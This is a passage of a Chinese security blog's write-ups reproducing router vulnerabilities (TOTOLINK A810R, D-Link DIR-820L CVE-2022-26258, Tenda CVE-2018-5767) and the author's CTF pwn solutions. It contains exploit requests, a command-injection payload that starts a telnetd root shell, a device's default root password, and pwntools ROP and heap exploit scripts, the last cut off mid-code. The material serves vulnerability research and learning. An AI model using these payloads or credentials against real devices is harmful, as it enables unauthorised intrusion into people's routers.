class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">requests.post(&#x27;http://192.168.6.3:37215/ctrlt/DeviceUpgrade_1&#x27;,headers=headers,data=data)</span><br></pre></td></tr></table></figure><p>如果成功执行 那么就会新建一个&#x2F;bin&#x2F;hell文件夹<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" alt="image.png"></a></p><h1 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h1><p>不难看出 漏洞的核心点就在于system函数的参数没有得到限制 如果在实际的漏洞挖掘中<br>应该遍历涉及到system函数的地方 然后看参数是否可控 可控的话参数是否进行了过滤<br>如果可以利用 那么就朔源如何访问到这一函数 随后编写exp</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TOTOLINK-A810R分析</title>
      <link href="/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/"/>
      <url>/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然间看到了一个cve  是totolink的其他型号 随后发现我手上的这个貌似也存在这个漏洞 于是记录一下自己发掘的过程<br>设备型号:TOTOLINK A810R<br>固件版本: V5.9c.4573_B20191019<br>下载地址: <a href="https://totolink.tw/support_view/A810R">https://totolink.tw/support_view/A810R</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>binwalk提取出文件系统后 老规矩还是来看一下架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" alt="image.png"></a><br>随后就是qemu系统模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>然后上传文件系统 chroot以及启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.zip root@192.168.6.3:/</span><br><span class="line">root/</span><br><span class="line">chroot ./squashfs-root /bin/sh</span><br><span class="line">./bin/lighttpd -f lighttp/lighttpd.conf  -m lighttp/lib/</span><br></pre></td></tr></table></figure><p>但是由于totolink的管理界面 常规的浏览器是不支持的 需要ie浏览器<br>但是linux安装ie浏览器过于麻烦 所以我直接闲鱼花30买了个真机用来复现</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先使用firmwalker来看一下文件系统中有什么可以利用的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ../iot/_TOTOLINK_A810R_V5.9c.4573_B20191019.web.extracted/squashfs-root ./firmwalker.txt</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" alt="image.png"></a><br>可以看到 存在着telnet服务 我们访问一下这个网页 看看有什么功能<br>访问后直接跳转到了登录界面<br>由于这里我们已经知道了用户密码 所以先登录进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" alt="image.png"></a><br>可以看到就是一个功能简单的 设置是否开启telnet服务的页面<br>这里直接使用burp来看一下按下apply按钮后发送的包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 60</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.0.1/telnet.asp?timestamp=1695703177052</span><br><span class="line">Cookie: SESSION_ID=2:1571586185:2</span><br><span class="line"></span><br><span class="line">&#123;&quot;telnet_enabled&quot;:&quot;1&quot;,</span><br><span class="line">&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向cstecgi.cgi进行了一个post请求<br>包含了一个json表单 一个有两个参数 telnet_enabled和topicurl<br>前者应该是用来控制是否开启telnet服务 而后者应该是用来决定处理方式<br>因为利用浏览器的开发者工具 可以捕捉到一个包的参数为 “topicurl”:”setting&#x2F;getTelnetCfg”<br>同时我们观察一下包的内容  可以发现其实对于是否登录并没有进行检测<br>我们凭借这个poc就可以做到越权开启telnet服务<br>扫描端口发现开在了23<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" alt="image.png"></a><br>尝试nc连接发现需要账号密码<br>而我们最开始使用firmwalker是扫描到了密码的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" alt="image.png"></a><br>打开看看这三个文件 发现是空的 不过紧邻着etc&#x2F;shadow的shadow.example存放着root用户的md5加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::</span><br><span class="line">nobody:*:0:0:99999:7:::</span><br></pre></td></tr></table></figure><p>解密后发现是cs2012<br>随后成功连接上路由器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-26258</title>
      <link href="/2023/09/23/CVE-2022-26258/"/>
      <url>/2023/09/23/CVE-2022-26258/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>设备型号:D-Link DIR-820L<br>固件下载地址:<a href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663">http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接直接选择使用Firmae进行模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR ./DIR820LA1_FW105B03.bin</span><br></pre></td></tr></table></figure><p>第一次使用Firmae可能需要等的比较久 我等了二十分钟左右<br>出现下图中的样子就是启动成功了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据提供的描述 可以得知漏洞出现在lan.asp中的device_name</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D-Link DIR-820L 1.05B03 was discovered to contain a remote command execution (RCE) vulnerability via the Device Name parameter in /lan.asp.</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" alt="image.png"></a><br>可以看到这个参数拼接到了paremStr中 作为copyDataToDataModelFormat函数的返回值<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" alt="image.png"></a><br>朔源一下这个函数 推测出来请求的目标网址应该是get_set.ccp<br>在squashfs-root文件夹中查询一下这个字符串<br>没有找到这个文件名 应该是放到了后端处理 但是出现了四个使用到的二进制文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" alt="image.png"></a><br>这里复制了这篇文章的描述: <a href="https://www.wangan.com/p/11v772975e2a5820">https://www.wangan.com/p/11v772975e2a5820</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">◆bin/smbd 程序是 Samba 服务器的一部分，它允许路由器用户与 Windows 客户端共享文件和打印机。Samba 服务器是一个开源软件，它实现了 SMB/CIFS 协议，这是 Windows 操作系统使用的文件和打印机共享协议。bin/smbd 程序是 Samba 服务器的核心组件之一，它提供了文件和打印机共享的功能。</span><br><span class="line"></span><br><span class="line">◆bin/flash 程序允许用户升级路由器固件，以获取最新的功能和安全补丁。它还可以用于还原路由器的出厂设置，以便在出现问题时恢复路由器的正常运行。</span><br><span class="line"></span><br><span class="line">◆sbin/ncc2 程序主要用于配置路由器的网络设置和管理路由器的各种功能。通过 ncc2 程序，用户可以轻松地设置无线网络、防火墙、端口转发等功能，使路由器的使用更加便捷和高效。</span><br><span class="line"></span><br><span class="line">◆lib/libapmib.so 是 D-Link 路由器系统中的一个库文件，它包含了许多重要的 API 和函数，用于实现路由器的各种功能。用户可以通过调用这些 API 和函数来访问和配置路由器的网络设置、无线网络、防火墙、端口转发等功能。</span><br></pre></td></tr></table></figure><p>所以这里我们选择ncc2这个程序 ida打开<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" alt="image.png"></a><br>调用了hasInjectionString函数来判断是否存在注入字符串 这里需要查找一下过滤了哪些内容<br>查找一下这个函数是在哪个动态库声明的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" alt="image.png"></a><br>最后成功找到了过滤的字符串<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" alt="image.png"></a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>直接在管理界面修改device_name 随后点击保存 利用burp抓包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" alt="image.png"></a><br>可以看到修改的应该是这个参数 这里选择使用telnetd来创建一个远程会话连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a</span><br></pre></td></tr></table></figure><p>%0a用来绕过字符判断<br>在7080端口建立一个&#x2F;bin&#x2F;sh的会话 等下直接nc这个端口就行了<br>可惜我自己试了半天都没有复现成功 不过学习个思路就行了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果要换我来挖掘漏洞的话 我认为应该是先批量查找调用了system函数的二进制文件 找到ncc2以后 再根据其拼接参数的来源去进一步找到device_name </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>cve-2018-5767</title>
      <link href="/2023/09/15/cve-2018-5767/"/>
      <url>/2023/09/15/cve-2018-5767/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一款arm架构的路由器 主要的漏洞位于httpd中 cookie可以产生栈溢出 同时httpd开启的保护很少 比较适合新手用于arm架构的学习<br>固件下载地址 <a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1</a></p><h1 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h1><p>使用binwalk提取出固件的文件系统<br>随后使用readelf查看一下固件的架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" alt="image.png"></a><br>可以看到是32位的ARM架构<br>接下来如果我们直接使用qemu-arm-static来启动httpd的话 会提示缺失库文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" alt="image.png"></a><br>我们需要把qemu-arm-static的文件拷贝到当前目录 随后利用chroot将当前目录作为根目录 随后再重新启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line">cp /usr/bin/qemu-arm-static .</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" alt="image.png"></a><br>但是你会发现此时程序卡在了这里<br>先利用ida打开httpd 在字符串中搜索Welcome to 很快就定位了具体的位置<br>可以看到对于v18的值进行了检查 如果小于等于0就陷入死循环<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" alt="image.png"></a><br>将断点打在这个puts函数 我们看看v18的值是怎么赋值的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">b *0x2CF7C</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>可以看到此时的死循环和R3寄存器的值有关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" alt="image.png"></a><br>我们需要利用keypatch更改mvn这一条指令 使得r3的值大于0后可以绕过死循环<br>但是可以看到此时虽然跳过了while的死循环 但是程序输出错误后就直接结束了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" alt="image.png"></a><br>还是老办法 定位到对应的字符串<br>代码审计可以发现是这个if判断的锅<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151225667.png" alt="image.png"></a><br>我们需要进入这个if分支 才能正常使用程序<br>则使得r3不为0即可<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151226154.png" alt="image.png"></a><br>随后又迎来了一个问题 可以看到虽然此时httpd已经成功启动 但是其获取到的ip地址明显不对 所以我们需要一个网桥接口来使得可以正常获取ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151227278.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install uml-utilities bridge-utils</span><br><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ifconfig br0 up</span><br><span class="line">sudo ifconfig br0 192.168.xx.xx</span><br></pre></td></tr></table></figure><p>随后我们再次运行httpd程序 可以发现成功获取到了ip地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162013409.png" alt="image.png"></a><br>暂时挂起这个进程 我们ping这个地址如果可以ping通就成功了<br>但是还是发现无法正常访问网页<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162038394.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp -rf ./webroot_ro/* ./webroot/`</span><br></pre></td></tr></table></figure><p>把目录复制一下就行了 原理暂时还没搞懂<br>这个师傅的文章看到的 <a href="https://cn-sec.com/archives/1727127.html">https://cn-sec.com/archives/1727127.html</a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>通过官方给出的分析<br><a href="https://fidusinfosec.com/remote-code-execution-cve-2018-5767/">https://fidusinfosec.com/remote-code-execution-cve-2018-5767/</a><br>可以知道漏洞点位于R7WebsSecurityHandler函数中<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162018442.png" alt="image.png"></a><br>调用了sscanf函数把cookie中的password参数传入到了栈上 而httpd文件就开启了一个NX<br>所以可以进行一个栈溢出的rop链利用<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162032062.png" alt="image.png"></a><br>看其他师傅是可以使用python脚本来发送请求的 但是不知道为啥我不行 所以这里采用bp来发包 （第二天补的这句话 发现是我的终端加了http和https的代理<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162059777.png" alt="image.png"></a><br>随后可以看到程序终止了 报段错误<br>于是使用gdb-multiarch来进行动态调试 寻找触发段错误的指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br><span class="line"></span><br><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162124061.png" alt="image.png"></a><br>可以看到程序卡在了这里 由于r3寄存器被我们填入的垃圾数据覆盖<br>而ldrb需要访问r3寄存器存储的内存地址中的数据 所以这里产生了非法的内存访问 从而导致了段错误<br>通过backtrace指令 可以看到此指令是由0x2c5cc触发的 在ida中寻找一下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162127376.png" alt="image.png"></a><br>在if分支中有一个函数涉及到了该地址<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162129667.png" alt="image.png"></a><br>所以我们要做的就是跳过if分支 这样才可以执行到我们控制的rop链<br>绕过if分支的条件则是在’.’后跟上这些后缀名<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309162130898.png" alt="image.png"></a><br>随后就是简单的栈溢出 直接打system就行了<br>但是 由于我的vmmap不知道为啥获取不到对应的libc地址<br>所以复现失败</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sictf_round2出题小记</title>
      <link href="/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/"/>
      <url>/2023/09/11/Sictf-round2%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>被非预期打穿了呜呜呜  应该清空一下栈的内容 或者加个内联汇编修改一下rdx寄存器的值</p><p>原本的做法是劫持rbp寄存器 修改rsi寄存器 随后就可以利用write函数泄露bss段上的libc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.arch = &quot;i386&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="comment">#io = remote(&quot;192.168.0.104&quot;,32770)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello!!!&quot;</span>)</span><br><span class="line">leak_addr = <span class="number">0x404040</span></span><br><span class="line">write_addr = <span class="number">0x4011E2</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0xa00</span>)</span><br><span class="line">ptr_addr = <span class="number">0x4011F1</span></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)+p64(leak_addr+<span class="number">0x20</span>+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p64(bss_addr)+p64(write_addr)+cyclic(<span class="number">0x10</span>)+p64(leak_addr+<span class="number">0x20</span>)+p64(ptr_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(p8(<span class="number">0x80</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x21a780</span></span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">rdi_addr = libc_addr + <span class="built_in">next</span>(libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>)))</span><br><span class="line">ret_addr = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4011FE&#x27;)</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>house of orange 不过对泄露堆地址的步骤改了改</p><p>没开PIE 这样可以用unsortedbin attack往存放堆块指针的地址写入堆地址 就可以泄露堆地址了</p><p>然后要明白unsortedbin attack为什么使用过一次后 再次进行堆块操作就会报错 是因为破坏了main_arena以及fd bk域 修复一下就可以再次进行unsortedbin attack了 随后就是house of orange的部分了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;210.44.151.51&quot;</span>,<span class="number">10202</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span 